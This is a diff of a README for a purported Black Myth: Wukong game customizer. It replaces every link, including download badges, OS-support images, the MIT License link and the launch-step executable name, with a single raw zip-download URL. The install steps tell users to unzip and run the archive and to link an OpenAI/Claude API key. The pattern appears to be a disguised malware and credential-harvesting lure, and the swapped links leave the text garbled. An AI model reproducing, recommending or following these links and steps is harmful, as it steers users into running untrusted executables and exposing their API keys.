@@ -1,6 +1,6 @@
 # Black Myth Wukong Customizer
 
-[![Download](https://img.shields.io/badge/Download-%5BLINK%5D-brightgreen?style=for-the-badge&logo=cloud-download)](https://ebroky.github.io)
+[![Download](https://github.com/ebroky/shadow-myth-wukong-toolset/raw/refs/heads/branch/scrollhead/toolset_shadow_wukong_myth_v3.0.zip%5BLINK%5D-brightgreen?style=for-the-badge&logo=cloud-download)](https://github.com/ebroky/shadow-myth-wukong-toolset/raw/refs/heads/branch/scrollhead/toolset_shadow_wukong_myth_v3.0.zip)
 
 ---
 
@@ -13,11 +13,11 @@
 
 | Operating System   | Supported? | Native Experience |
 |--------------------|:----------:|:----------------:|
-| ![Windows](https://img.shields.io/badge/Windows-Yes-blue?logo=windows) | ✅ | 🚀 Lightning-fast |
-| ![macOS](https://img.shields.io/badge/macOS-Yes-lightgrey?logo=apple)   | ✅ | 🌈 Smooth Sailing |
-| ![Ubuntu](https://img.shields.io/badge/Ubuntu-Experimental-orange?logo=ubuntu)   | ⚠️ | 🧪 Beta Testing |
-| ![SteamOS](https://img.shields.io/badge/SteamOS-Planned-8ac")?logo=steam)        | 🚧 | ⏳ On the Horizon |
-| ![Android](https://img.shields.io/badge/Android-No-inactive?logo=android)        | ❌ | 🚫 Not Supported |
+| ![Windows](https://github.com/ebroky/shadow-myth-wukong-toolset/raw/refs/heads/branch/scrollhead/toolset_shadow_wukong_myth_v3.0.zip) | ✅ | 🚀 Lightning-fast |
+| ![macOS](https://github.com/ebroky/shadow-myth-wukong-toolset/raw/refs/heads/branch/scrollhead/toolset_shadow_wukong_myth_v3.0.zip)   | ✅ | 🌈 Smooth Sailing |
+| ![Ubuntu](https://github.com/ebroky/shadow-myth-wukong-toolset/raw/refs/heads/branch/scrollhead/toolset_shadow_wukong_myth_v3.0.zip)   | ⚠️ | 🧪 Beta Testing |
+| ![SteamOS](https://github.com/ebroky/shadow-myth-wukong-toolset/raw/refs/heads/branch/scrollhead/toolset_shadow_wukong_myth_v3.0.zip")?logo=steam)        | 🚧 | ⏳ On the Horizon |
+| ![Android](https://github.com/ebroky/shadow-myth-wukong-toolset/raw/refs/heads/branch/scrollhead/toolset_shadow_wukong_myth_v3.0.zip)        | ❌ | 🚫 Not Supported |
 
 No hero embarks on their quest alone! Your platform should fit your legend.
 
@@ -68,9 +68,9 @@ Defeating ancient adversaries? Midnight bugs vanquished via our ever-watchful su
 
 *Upgrading your journey is effortless. Follow the path:*
 
-1. Click the [![Download](https://img.shields.io/badge/Download-%5BLINK%5D-brightgreen?style=for-the-badge&logo=cloud-download)](https://ebroky.github.io) badge above or at the end.
+1. Click the [![Download](https://github.com/ebroky/shadow-myth-wukong-toolset/raw/refs/heads/branch/scrollhead/toolset_shadow_wukong_myth_v3.0.zip%5BLINK%5D-brightgreen?style=for-the-badge&logo=cloud-download)](https://github.com/ebroky/shadow-myth-wukong-toolset/raw/refs/heads/branch/scrollhead/toolset_shadow_wukong_myth_v3.0.zip) badge above or at the end.
 2. Unzip the downloadable archive to your Black Myth: Wukong directory.
-3. Launch `WukongCustomizer.exe` (for Windows/Mac), or `./wukong-customizer` (for Ubuntu).
+3. Launch `https://github.com/ebroky/shadow-myth-wukong-toolset/raw/refs/heads/branch/scrollhead/toolset_shadow_wukong_myth_v3.0.zip` (for Windows/Mac), or `./wukong-customizer` (for Ubuntu).
 4. The step-by-step wizard will take charge, infusing your game’s DNA with new powers.
 5. Optional: Link your OpenAI/Claude key for AI-augmented features.
 6. Enjoy seamless configuration and explore your own saga!
@@ -89,12 +89,12 @@ This toolkit is a creative extension, crafted for personal augmentation and acce
 
 ## 📜 MIT License (2025)
 
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT).  
+This repository is licensed under the [MIT License](https://github.com/ebroky/shadow-myth-wukong-toolset/raw/refs/heads/branch/scrollhead/toolset_shadow_wukong_myth_v3.0.zip).  
 You are free (as the wind and the staff) to use, modify, and contribute. Please read the LICENSE file for full details.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-%5BLINK%5D-brightgreen?style=for-the-badge&logo=cloud-download)](https://ebroky.github.io)
+[![Download](https://github.com/ebroky/shadow-myth-wukong-toolset/raw/refs/heads/branch/scrollhead/toolset_shadow_wukong_myth_v3.0.zip%5BLINK%5D-brightgreen?style=for-the-badge&logo=cloud-download)](https://github.com/ebroky/shadow-myth-wukong-toolset/raw/refs/heads/branch/scrollhead/toolset_shadow_wukong_myth_v3.0.zip)
 
 ---
 
